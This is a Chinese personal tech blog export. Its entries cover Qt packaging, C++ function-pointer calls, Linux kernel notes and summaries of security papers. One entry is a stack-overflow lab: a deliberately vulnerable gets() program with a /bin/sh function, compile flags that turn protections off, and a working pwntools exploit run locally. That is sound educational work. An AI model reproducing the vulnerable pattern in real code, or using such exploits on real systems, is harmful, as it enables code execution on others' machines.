<li>根据标准输出找问题</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608103812082.png" alt="image-20210608103812082"></p>
<ul>
<li>这里的问题是找不到 libQt5XcbQpa.so.5</li>
<li>可以去 Qt 安装目录的 platforms 目录找（出现 xcb 问题一般是因为以上 platforms 中执行 copylib 的顺序有问题，如果先将 platforms 复制到新目录再执行 copylib 就会缺失一部分库，因此需要在 Qt 安装目录中执行）</li>
</ul>
<h3 id="1-6-移植到其他机器的注意事项"><a href="#1-6-移植到其他机器的注意事项" class="headerlink" title="1. 6 移植到其他机器的注意事项"></a>1. 6 移植到其他机器的注意事项</h3><ul>
<li>打包后，启动程序应该使用 <code>projectName.sh</code> 而不是直接运行 projectName 的二进制文件</li>
<li>执行上述 sh 文件可能会提示权限不够，这时需要给 projectName 二进制文件以及 projectName.sh 脚本 777 权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 projectName</span><br><span class="line">chmod 777 projectName.sh </span><br></pre></td></tr></table></figure>
<h3 id="1-7-Reference"><a href="#1-7-Reference" class="headerlink" title="1.7 Reference"></a>1.7 Reference</h3><ol>
<li><p>打包 <a href="https://blog.csdn.net/z3512498/article/details/64922180?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control&amp;dist_request_id=1328603.71798.16152866709520987&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control">https://blog.csdn.net/z3512498/article/details/64922180?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control&amp;dist_request_id=1328603.71798.16152866709520987&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control</a></p>
</li>
<li><p>xcb <a href="https://www.cnblogs.com/ldxn/p/11791810.html">https://www.cnblogs.com/ldxn/p/11791810.html</a></p>
</li>
<li><p>xcb <a href="https://blog.csdn.net/sinat_26106275/article/details/82778951">https://blog.csdn.net/sinat_26106275/article/details/82778951</a></p>
</li>
</ol>
<h2 id="2-Windows环境"><a href="#2-Windows环境" class="headerlink" title="2 Windows环境"></a>2 Windows环境</h2><h3 id="2-1-构建-Release-版本"><a href="#2-1-构建-Release-版本" class="headerlink" title="2.1 构建 Release 版本"></a>2.1 构建 Release 版本</h3><p>与 Linux 环境同理</p>
<h3 id="2-2-windeployqt-工具拷贝库文件"><a href="#2-2-windeployqt-工具拷贝库文件" class="headerlink" title="2.2 windeployqt 工具拷贝库文件"></a>2.2 windeployqt 工具拷贝库文件</h3><ul>
<li><p>新建文件夹，将 Release 目录中的 exe 文件拷贝到新文件夹下</p>
</li>
<li><p>命令行工具</p>
</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608173440728.png" alt="image-20210608173440728"></p>
<ul>
<li>在命令行中，进入以上新建的目录，并执行命令 <code>windeployqt Server.exe</code>，其中 Server.exe 为 Release 拷过来的可执行文件</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608173846947.png" alt="image-20210608173846947"></p>
<ul>
<li>执行完后，文件夹中会多出很多 dll 以及其他一些依赖，Server.exe 也可以正常运行了</li>
</ul>
<h3 id="2-3-Reference"><a href="#2-3-Reference" class="headerlink" title="2.3 Reference"></a>2.3 Reference</h3><p><a href="https://blog.csdn.net/u014453443/article/details/85837138">https://blog.csdn.net/u014453443/article/details/85837138</a></p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出实验</title>
    <url>/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<p><code>gets</code> 参考 CSAPP P195<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">gets</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span>* dest = s;</span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF) &#123;</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line">    <span class="built_in">gets</span>(&amp;v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>修改 version2</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">gets</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span>* dest = s;</span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF) &#123;</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>*  <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vuln</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>关闭保护</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -fno-stack-protector -z execstack -no-pie stack.cpp -o stack</span><br></pre></td></tr></table></figure>
<ul>
<li>得到可执行文件 stack，拿到 IDA 64 反编译</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235648172.png" alt="image-20210623235648172"></p>
<ul>
<li><code>checksec --file=stack</code> 结果如下</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235709636.png" alt="image-20210623235709636"></p>
<ul>
<li>vuln 函数如下</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000730044.png" alt="image-20210624000730044"></p>
<ul>
<li>栈信息如下，因此需要覆盖 9 个字符到达返回地址</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000706356.png" alt="image-20210624000706356"></p>
<ul>
<li>shell 地址 0x4006F4；shell 的 retn 地址 0x400705（因为本地环境是 Ubuntu 18，所以要做堆栈平衡需要知道 retn 地址）</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235917096.png" alt="image-20210623235917096"></p>
<ul>
<li>exp.py 代码如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">shell = <span class="number">0x4006F4</span></span><br><span class="line">retn = <span class="number">0x400705</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">9</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li><code>python exp.py</code>，可以打通本地，结果如下</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000416446.png" alt="image-20210624000416446"></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>漏洞实验</tag>
      </tags>
  </entry>
  <entry>
    <title>Third Eye Context-Aware Detection for Hidden Terminal Emulation Attacks in Cognitive Radio-Enabled IoT Networks</title>
    <url>/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>IoT security, context-aware detection, Markov chain, hidden Markov model</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>IoT  Internet of Things  物联网</li>
<li>认知无线电 Cognitive Radio<ul>
<li>具有学习能力，能与周围环境交互信息，以感知和利用在该空间的可用频谱，并限制和降低冲突的发生。</li>
</ul>
</li>
<li>hidden terminal emulation  隐藏终端仿真</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/image-20210524210542892.png" alt="image-20210524210542892"></p>
<h3 id="HTE-攻击"><a href="#HTE-攻击" class="headerlink" title="HTE 攻击"></a>HTE 攻击</h3><ul>
<li><p><strong>方法概要：</strong>攻击者利用天线辐射方向图来模拟隐藏终端(位置伪造攻击的一种形式)。  </p>
</li>
<li><p><strong>攻击前提：</strong>在先前的工作中，位置伪造被认为是一个本地化问题，锚设备（专门用于定位任何设备的设备）在检测位置伪造攻击中起着重要的作用。但是在大多数物联网应用中，物联网设备不可能配备复杂的本地化功能，在密集的IoT网络中部署锚设备也不现实。因此，在密集的物联网场景中，现成的位置欺骗检测方法不适用。  </p>
</li>
<li><p><strong>攻击过程：</strong></p>
<ul>
<li>攻击者通过wardriving等现有技术获取IoT设备的位置（角度、距离等）</li>
<li>然后根据攻击者的目标或者物理限制，攻击者可能会尝试将其作为被攻击者的所有邻居或者选定邻居的隐藏终端</li>
<li>HTE攻击者在此阶段的主要任务是成功模拟受害者附近的隐藏终端的辐射特性。  </li>
</ul>
</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/00隐藏终端仿真攻击.png" alt="00隐藏终端仿真攻击"></p>
<p>图a中，攻击者试图将自己伪装成节点A1，A3，A5的隐藏终端，它们只对A2，A4，A6传输。天线的智能利用使攻击者能够仿真不同的物理场景，如图b，即仿真阶段。 </p>
<p>在此阶段，HTE攻击者继续通过宽带感知来感测工作频带，并分别嗅探发往或发自受害节点的RTS和CTS消息的频带。它试图故意干扰从节点A1，A3和A5发送到受害节点（即A4）的传输。但是，干扰率的选择取决于攻击者的策略。它可能会干扰每次传输，随机干扰或在良性或恶意行为之间采取间歇性策略。在本文中，我们讨论了这些不同的攻击策略，以及它们针对上下文感知的HTE检测方法保持免疫力的能力。这种检测技术将创建一个上下文模型，以区分良性和恶意行为。因此，攻击者将尝试紧密模仿良性模型的行为，以使其未被检测到，但保持其攻击性能。我们认为攻击者（即HTE-1）采取了一种微妙的随机方法，即通过与其自身网络（即HTE-2）中的邻居继续进行常规通信，将其伪装成合法节点，并且攻击者会智能地干扰仅在攻击者闲置时（即未与HTE-2通信）接收受害者的信息。因此，与常规的反应式干扰攻击相比，它提供了不同的检测挑战。</p>
<ul>
<li><strong>攻击结果：</strong>干扰特定的传输  </li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8964452">https://ieeexplore.ieee.org/document/8964452</a></p>
<h2 id="Oth"><a href="#Oth" class="headerlink" title="Oth"></a>Oth</h2><h3 id="针对移动终端的攻击方式"><a href="#针对移动终端的攻击方式" class="headerlink" title="针对移动终端的攻击方式"></a>针对移动终端的攻击方式</h3><ul>
<li>中间人攻击拦截网络流量</li>
<li>通过操作系统的安全漏洞或者硬件漏洞进行攻击</li>
<li><p>在应用中植入恶意代码</p>
<ul>
<li>BOptions sideloading技术<ul>
<li><a href="https://zhuanlan.zhihu.com/p/40203178">BOption侧载机制</a> </li>
<li><a href="https://www.securityweek.com/attackers-target-iphones-using-open-source-mdm-solution">其他参考</a>  </li>
<li>向合法应用程序中添加恶意代码，目的是在应用程序中注入动态库。  </li>
<li>这些插入应用程序的恶意代码能够收集并盗窃设备中的信息，如电话号码、序列号、位置、联系人、用户照片、短信、邮件、WhatsApp聊天消息等，攻击者可以利用这些信息要挟受害者或实施另外的攻击。  </li>
<li>在设备上安装附加证书以允许远程管理操作的过程中可能会导致潜在的恶意活动。</li>
</ul>
</li>
</ul>
</li>
<li><p>针对电源的Bad Power攻击</p>
</li>
</ul>
<h3 id="针对PC系统"><a href="#针对PC系统" class="headerlink" title="针对PC系统"></a>针对PC系统</h3><ul>
<li>针对打印机的APT攻击<ul>
<li><a href="https://www.freebuf.com/articles/terminal/92482.html">打印机APT攻击</a>  通过LDAP提取Windows Active Directory的证书或者滥用“扫描文件”和“扫描电子邮件”功能  </li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>HTE攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>获取函数地址并调用函数</title>
    <url>/2021/06/08/%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%B9%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="最简单的直接测试"><a href="#最简单的直接测试" class="headerlink" title="最简单的直接测试"></a>最简单的直接测试</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;DONE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; test &lt;&lt; endl;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*myCALL)();</span><br><span class="line">    myCALL = test;</span><br><span class="line">    (*myCALL)();</span><br><span class="line">    cout &lt;&lt; *myCALL &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="从数组中获取地址并调用"><a href="#从数组中获取地址并调用" class="headerlink" title="从数组中获取地址并调用"></a>从数组中获取地址并调用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;DONE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callFunc</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*pro)();</span><br><span class="line">    pro = (<span class="built_in"><span class="keyword">void</span></span> (*)()) x;</span><br><span class="line">    (*pro)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; address;</span><br><span class="line">    address.<span class="built_in">push_back</span>(<span class="built_in"><span class="keyword">int</span></span>(test));</span><br><span class="line">    cout &lt;&lt; test &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">callFunc</span>(address[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="获取类成员函数地址并调用-1"><a href="#获取类成员函数地址并调用-1" class="headerlink" title="获取类成员函数地址并调用$^{1}$"></a>获取类成员函数地址并调用$^{1}$</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fn</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;myCallFunc is Done~&quot;</span> &lt;&lt; endl; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> dst_type, <span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function">dst_type <span class="title">pointer_cast</span><span class="params">(src_type src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">static_cast</span>&lt;dst_type*&gt;(<span class="keyword">static_cast</span>&lt;<span class="keyword">void</span>*&gt;(&amp;src));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getAddress</span><span class="params">(<span class="keyword">decltype</span> (&amp;A::fn) x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* ptr = pointer_cast&lt;<span class="keyword">void</span>*&gt;(x);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">long</span>)ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callFunc</span><span class="params">(<span class="keyword">long</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*pro)();</span><br><span class="line">    pro = (<span class="built_in"><span class="keyword">void</span></span>(*)()) x;</span><br><span class="line">    (*pro)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> address = <span class="built_in">getAddress</span>(&amp;A::fn);</span><br><span class="line">    <span class="built_in">callFunc</span>(address);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="对应的函数模板与使用方法"><a href="#对应的函数模板与使用方法" class="headerlink" title="对应的函数模板与使用方法"></a>对应的函数模板与使用方法</h3><h4 id="getAddress"><a href="#getAddress" class="headerlink" title="getAddress"></a>getAddress</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> dst_type, <span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function">dst_type <span class="title">getAddress</span><span class="params">(src_type x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* ptr = pointer_cast&lt;<span class="keyword">void</span>*&gt;(x);</span><br><span class="line">    <span class="keyword">return</span> (dst_type)ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> address = (<span class="keyword">long</span>)getAddress&lt;<span class="keyword">void</span>*&gt;(&amp;FuncFlowT::funcA);</span><br></pre></td></tr></table></figure>
<h4 id="callFunc"><a href="#callFunc" class="headerlink" title="callFunc"></a>callFunc</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callFunc</span><span class="params">(src_type x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*pro)();</span><br><span class="line">    pro = (<span class="built_in"><span class="keyword">void</span></span>(*)()) x;</span><br><span class="line">    (*pro)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">callFunc&lt;<span class="keyword">long</span>&gt;(address);</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><p><a href="https://www.cnblogs.com/memset/p/get_member_function_address_cpp.html">https://www.cnblogs.com/memset/p/get_member_function_address_cpp.html</a></p>
</li>
<li><p><a href="https://bbs.csdn.net/topics/80149694">https://bbs.csdn.net/topics/80149694</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>面向智能终端的快捷支付双花攻击检测模型</title>
    <url>/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>数字加密货币; 安全交易; 双花攻击; 人工免疫; 异常检测</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><h3 id="51-攻击"><a href="#51-攻击" class="headerlink" title="51% 攻击"></a>51% 攻击</h3><ul>
<li>指攻击者利用算力优势（大于50%）强行修改 合法的交易记录，实现一笔虚拟货币两次消费</li>
<li>对于比特币交易而言，每个用户节点都可参与交易的合法性验证和确认。</li>
<li>参与交易的节点就是矿工节点，他们用CPU计算资源进行挖矿（利用CPU资源计算随机数），通过工作量证明（POW）机制进行账单记录权的争夺，胜利者将得到一份比特币作为奖励。</li>
</ul>
<h4 id="攻击条件说明"><a href="#攻击条件说明" class="headerlink" title="攻击条件说明"></a>攻击条件说明</h4><p>条件一：根据比特币协议，后到的同源交易将被丢弃</p>
<p>条件三：因为比特币用户是匿名的，而且一个 用户可拥有多个账号，所以当服务结束了，即使卖 主意识到了异常，也很难鉴别出攻击者，导致双花 攻击的可能性增大。</p>
<h3 id="预防双花攻击"><a href="#预防双花攻击" class="headerlink" title="预防双花攻击"></a>预防双花攻击</h3><p>以比特币为代表的主流数字加密货币，通过工作量证明的机制和一个记录所有确认交易的公共链来预防双花攻击</p>
<h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>根据比特币白皮书中的说明可知，比特币网络以交易时间为代价来累积确认交易区块的高度从而对抗双花攻击。</p>
<p><img src="/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/image-20210524205529138.png" alt="image-20210524205529138"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>免疫</tag>
        <tag>异常检测</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核设计与实现笔记</title>
    <url>/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="第-1-章-Linux-内核简介"><a href="#第-1-章-Linux-内核简介" class="headerlink" title="第 1 章 - Linux 内核简介"></a>第 1 章 - Linux 内核简介</h2><h3 id="1-1-单内核与微内核"><a href="#1-1-单内核与微内核" class="headerlink" title="1.1 单内核与微内核"></a>1.1 单内核与微内核</h3><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>概念</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td>单内核</td>
<td>所有内核服务在一个大内核地址空间运行</td>
<td>1. 简单<br>2. 高效（内核之间的通信没什么开销，内核可以直接调用函数）</td>
<td>可用性不好（一个服务影响其他服务）</td>
</tr>
<tr>
<td>微内核</td>
<td>1. 微内核的功能被划分成多个独立过程<br>2. 所有过程运行在自己的地址空间。</td>
<td>1. 可用性高（一个服务失效并不影响其他服务）<br>2. 模块化（互换服务）</td>
<td>消息传递开销大</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p><strong>Linux 是单内核</strong>，但</p>
<ul>
<li><p>包含了<strong>微内核的精华</strong>：模块化 + 抢占式内核 + 内核线程 + 动态装载内核模块</p>
</li>
<li><p>避免了<strong>微内核的缺陷</strong>：所有事情运行在内核态，无需消息传递</p>
